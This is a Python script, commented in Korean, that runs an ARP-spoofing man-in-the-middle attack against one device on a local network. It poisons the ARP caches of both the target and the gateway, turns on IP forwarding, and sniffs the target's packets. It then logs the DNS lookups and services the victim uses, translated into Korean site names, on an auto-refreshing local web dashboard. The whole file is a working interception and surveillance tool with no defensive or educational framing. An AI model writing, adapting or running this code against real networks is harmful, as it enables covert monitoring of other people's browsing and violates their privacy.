import threading, time, os, socket, webbrowser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from scapy.all import sniff, IP, DNS, DNSQR, TCP, UDP, ARP, send, Ether, srp, conf

# --- [필수 설정] ---
TARGET_IP = "10.31.1.25"
GATEWAY_IP = "10.31.0.254" 
buffer_logs = []  
final_logs = []   

# --- [한글 변환 사전] ---
# 사이트 주소 및 IP를 한글 이름으로 매칭합니다.
KOREAN_MAP = {
    # 도메인 기반
"224.0.0.251": "주변 기기 탐색 (mDNS)",
    "5353": "기기 연결 확인용",   
 "naver.com": "네이버 (Naver)",
    "kakao.com": "카카오톡 (Kakao)",
    "youtube.com": "유튜브 (YouTube)",
    "googlevideo.com": "유튜브 영상",
    "google.com": "구글 (Google)",
    "daum.net": "다음 (Daum)",
    "instagram.com": "인스타그램",
    "coupang.com": "쿠팡 (Coupang)",
    "toss.im": "토스 (Toss)",
    "netflix.com": "넷플릭스",
    "apple.com": "애플 서비스",
    # IP 기반 (자주 쓰이는 서버 IP 대역 일부 예시)
    "10.31.0.254": "우리집 공유기",
    "8.8.8.8": "구글 DNS 서버",
    "8.8.4.4": "구글 DNS 서버",
    "1.1.1.1": "클라우드플레어"
}

def get_korean(text):
    """영어 주소나 IP를 사전에 정의된 한글로 변환"""
    text_str = str(text).lower()
    for eng, kor in KOREAN_MAP.items():
        if eng in text_str:
            return f"✨ {kor}"
    return text # 매칭되는 게 없으면 원래 값(IP나 도메인) 유지

def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        for _, rcv in ans: return rcv[Ether].src
    except: return None

def spoof_loop():
    t_mac, g_mac = get_mac(TARGET_IP), get_mac(GATEWAY_IP)
    if not t_mac or not g_mac:
        print("❌ 기기를 찾을 수 없습니다. IP를 확인하세요.")
        return
    while True:
        try:
            send(ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP, hwdst=t_mac), verbose=False)
            send(ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP, hwdst=g_mac), verbose=False)
            time.sleep(2)
        except: break

def get_service(port):
    services = {443: "보안통신(HTTPS)", 80: "일반웹(HTTP)", 53: "주소찾기(DNS)", 3478: "게임/음성"}
    return services.get(port, f"포트:{port}")

def packet_callback(pkt):
    try:
        if pkt.haslayer(IP):
            src, dst = pkt[IP].src, pkt[IP].dst
            if src == TARGET_IP or dst == TARGET_IP:
                peer = dst if src == TARGET_IP else src
                info = ""
                # DNS 쿼리 확인 (사이트 주소 추출)
                if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
                    info = f"{pkt[DNSQR].qname.decode(errors='ignore').strip('.')}"
                # TCP/UDP 포트 확인
                elif pkt.haslayer(TCP):
                    p = pkt[TCP].dport if src == TARGET_IP else pkt[TCP].sport
                    info = get_service(p)
                elif pkt.haslayer(UDP):
                    p = pkt[UDP].dport if src == TARGET_IP else pkt[UDP].sport
                    info = get_service(p)
                
                if info:
                    buffer_logs.append({"time": time.strftime('%H:%M:%S'), "peer": peer, "msg": info})
    except: pass

def summarize_loop():
    global buffer_logs, final_logs
    while True:
        time.sleep(3)
        if buffer_logs:
            unique_items = []
            seen = set()
            for log in reversed(buffer_logs):
                # IP와 메시지 모두 한글로 변환 시도
                kor_peer = get_korean(log['peer'])
                kor_msg = get_korean(log['msg'])
                
                key = f"{kor_peer}-{kor_msg}"
                if key not in seen:
                    unique_items.append({"peer": kor_peer, "msg": kor_msg})
                    seen.add(key)
            
            final_logs.insert(0, {"period": f"{time.strftime('%H:%M:%S')} 요약", "items": unique_items[:8]})
            if len(final_logs) > 20: final_logs.pop()
            buffer_logs = []

class LogHandler(BaseHTTPRequestHandler):
    def log_message(self, *args): return
    def do_GET(self):
        if self.path == "/":
            content = ""
            for block in final_logs:
                items_html = "".join([f"<li style='padding:5px 0; border-bottom:1px solid #374151;'>🌍 {item['peer']} <br>└─> <b>{item['msg']}</b></li>" for item in block['items']])
                content += f'<div style="background:#1f2937; margin:15px 0; border-radius:8px; border-left:4px solid #10b981; overflow:hidden;">' \
                           f'<div style="background:#374151; padding:8px 15px; font-size:12px; font-weight:bold; color:#10b981;">{block["period"]}</div>' \
                           f'<ul style="list-style:none; padding:10px 15px; margin:0; color:#e5e7eb; font-size:14px; line-height:1.6;">{items_html}</ul></div>'
            
            if not content: content = "<p style='text-align:center; padding:50px; color:#64748b;'>데이터 수집 중... (3초 대기)</p>"
            
            self.send_response(200); self.send_header("Content-Type", "text/html; charset=utf-8"); self.end_headers()
            html = f"<html><head><meta charset='utf-8'><script>setTimeout(()=>location.reload(),3000)</script></head>" \
                   f"<body style='background:#111827; color:#e5e7eb; font-family:sans-serif; padding:20px;'>" \
                   f"<div style='max-width:800px; margin:0 auto;'><h2>🕵️‍♂️ 한글화 패킷 모니터링 [{TARGET_IP}]</h2>" \
                   f"<button onclick=\"fetch('/api/exit').then(()=>window.close())\" style='background:#ef4444; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer; float:right;'>종료</button>{content}</div></body></html>"
            self.wfile.write(html.encode())
        elif self.path == "/api/exit": os._exit(0)

def main():
    os.system("powershell Set-NetIPInterface -Forwarding Enabled > $null 2>&1")
    threading.Thread(target=spoof_loop, daemon=True).start()
    threading.Thread(target=lambda: sniff(prn=packet_callback, store=0), daemon=True).start()
    threading.Thread(target=summarize_loop, daemon=True).start()
    
    port = 8888
    webbrowser.open(f"http://127.0.0.1:{port}")
    ThreadingHTTPServer(('127.0.0.1', port), LogHandler).serve_forever()

if __name__ == "__main__": main()